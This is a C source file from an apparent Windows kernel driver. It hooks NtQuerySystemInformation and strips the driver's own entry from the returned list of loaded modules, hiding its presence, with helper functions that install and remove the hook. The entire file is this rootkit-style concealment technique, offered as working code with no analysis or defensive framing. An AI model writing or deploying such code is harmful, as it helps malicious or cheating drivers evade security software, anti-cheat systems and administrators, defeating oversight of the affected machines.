#include "module_hiding.h"
#include "common.h"
#include "hooks.h"
typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
static NTQUERYSYSTEMINFORMATION g_Original = NULL;

static NTSTATUS Hooked(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                       PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS status = g_Original(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (!g_SpoofData.Enabled || !NT_SUCCESS(status) || SystemInformationClass != 0xB) return status;
    PSYSTEM_MODULE_INFORMATION modInfo = (PSYSTEM_MODULE_INFORMATION)SystemInformation;
    PVOID ourBase = g_DeviceObject->DriverObject->DriverStart;
    for (ULONG i = 0; i < modInfo->ModulesCount; i++) {
        if (modInfo->Modules[i].ImageBase == ourBase) {
            if (i < modInfo->ModulesCount - 1)
                RtlMoveMemory(&modInfo->Modules[i], &modInfo->Modules[i+1], (modInfo->ModulesCount - i - 1) * sizeof(SYSTEM_MODULE_ENTRY));
            modInfo->ModulesCount--;
            if (ReturnLength) *ReturnLength -= sizeof(SYSTEM_MODULE_ENTRY);
            break;
        }
    }
    return status;
}
void InitModuleHiding() {
    UNICODE_STRING name; RtlInitUnicodeString(&name, L"NtQuerySystemInformation");
    g_Original = (NTQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&name);
    if (g_Original) InstallHookX64(g_Original, Hooked, &g_ModuleHideHook);
}
void CleanupModuleHiding() { RemoveHookX64(&g_ModuleHideHook); }
